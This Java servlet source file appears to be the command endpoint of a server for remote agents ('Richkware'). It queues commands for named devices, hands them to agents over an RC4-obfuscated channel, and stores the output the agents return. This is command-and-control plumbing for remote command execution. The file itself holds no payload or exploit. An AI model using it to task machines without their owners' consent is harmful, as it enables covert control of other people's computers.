package it.richkmeli.rms.web;

import it.richkmeli.jframework.crypto.Crypto;
import it.richkmeli.jframework.orm.DatabaseException;
import it.richkmeli.rms.web.response.KOResponse;
import it.richkmeli.rms.web.response.OKResponse;
import it.richkmeli.rms.web.response.StatusCode;
import it.richkmeli.rms.web.util.ServletManager;
import it.richkmeli.rms.web.util.Session;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.*;

@WebServlet({"/command"})
public class command extends HttpServlet {
    private String password;

    public command() {
        super();
        password = ResourceBundle.getBundle("configuration").getString("encryptionkey");
    }

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        PrintWriter out = resp.getWriter();
        HttpSession httpSession = req.getSession();
        Session session = null;

        try {

            BufferedReader br = req.getReader();
            String response = br.readLine();

//            session = ServletManager.getServerSession(httpSession);
//
//            JSONObject JSONData = new JSONObject(response);
//            String deviceName = JSONData.getString("data0");
//            String requestor = JSONData.getString("data1");
//
//
//            if (deviceName != null && requestor != null) {
//                String output = null;
//
//                if (requestor.equalsIgnoreCase("agent")) {
//                    output = session.getDeviceDatabaseManager().getCommands(deviceName);
//                } else if (requestor.equalsIgnoreCase("client")) {
//                    output = session.getDeviceDatabaseManager().getCommandsOutput(deviceName);
//                    session.getDeviceDatabaseManager().setCommandsOutput(deviceName, "");
//                }
//
//                if (!output.isEmpty()) {
//                    out.println((new OKResponse(StatusCode.SUCCESS, output)).json());
//                } else {
//                    out.println((new KOResponse(StatusCode.FIELD_EMPTY)).json());
//                }
//            }
//
//            br.close();

            session = ServletManager.getServerSession(httpSession);

            Map<String, String> attribMap = ServletManager.doDefaultProcessRequest(req);

            String deviceName = attribMap.get("data0");

            String output = null;

            if (ServletManager.Channel.RICHKWARE.equalsIgnoreCase(req.getParameter("channel"))) {
                deviceName = Crypto.decryptRC4(deviceName, password);
                output = session.getDeviceDatabaseManager().getCommands(deviceName);
            } else {
                output = session.getDeviceDatabaseManager().getCommandsOutput(deviceName);
                output = ServletManager.doDefaultProcessResponse(req, output);
            }
            if (!output.isEmpty()) {
                out.println((new OKResponse(StatusCode.SUCCESS, output)).json());
            } else {
                out.println((new KOResponse(StatusCode.FIELD_EMPTY)).json());
            }
        } catch (DatabaseException e) {
            out.println((new KOResponse(StatusCode.DB_ERROR, e.getMessage())).json());
        } catch (Exception e) {
            out.println((new KOResponse(StatusCode.GENERIC_ERROR, e.getMessage())).json());
        }
    }

    @Override
    protected void doPut(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        //TODO: gestire richieste per multipli device

        PrintWriter out = resp.getWriter();
        HttpSession httpSession = req.getSession();
        Session session = null;

        try {
            BufferedReader br = req.getReader();
            String data = br.readLine();
            JSONObject JSONData = new JSONObject(data);
            JSONArray devicesName = JSONData.getJSONArray("devices");
            String commands = JSONData.getString("commands");

            session = ServletManager.getServerSession(httpSession);

            List<String> failedResponse = new ArrayList<>();
            for (Object device : devicesName) {
                if (!session.getDeviceDatabaseManager().editCommands((String) device, commands)) {
                    failedResponse.add((String) device);
                }
            }

            if (failedResponse.isEmpty())
                out.println((new OKResponse(StatusCode.SUCCESS)).json());
            else {
                out.println((new KOResponse(StatusCode.FIELD_EMPTY, Arrays.toString(failedResponse.toArray()))).json());
            }

            br.close();
        } catch (it.richkmeli.rms.web.util.ServletException | JSONException | DatabaseException e/* | CryptoException e*/) {
            out.println((new KOResponse(StatusCode.GENERIC_ERROR, e.getMessage())).json());
        }
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        PrintWriter out = resp.getWriter();
        HttpSession httpSession = req.getSession();
        Session session = null;

        try {
            BufferedReader br = req.getReader();
            String response = br.readLine();

            JSONObject JSONData = new JSONObject(response);
            String deviceName = JSONData.getString("device");
            String commandsOutput = JSONData.getString("data");

            //commandsOutput = Crypto.decryptRC4(commandsOutput, password);
            //commandsOutput= new String(Base64.getUrlDecoder().decode(commandsOutput));
            // Reverse command output has to be sent to the front end in base64 format

            session = ServletManager.getServerSession(httpSession);

            boolean result = session.getDeviceDatabaseManager().setCommandsOutput(deviceName, commandsOutput);
            if (result) {
                session.getDeviceDatabaseManager().editCommands(deviceName, "");
                out.println((new OKResponse(StatusCode.SUCCESS)).json());
            } else {
                out.println((new KOResponse(StatusCode.FIELD_EMPTY, "Field not found in DB")).json());
            }
            br.close();
        } catch (it.richkmeli.rms.web.util.ServletException | JSONException | DatabaseException e/* | CryptoException e*/) {
            out.println((new KOResponse(StatusCode.GENERIC_ERROR, e.getMessage())).json());
        }
    }

}
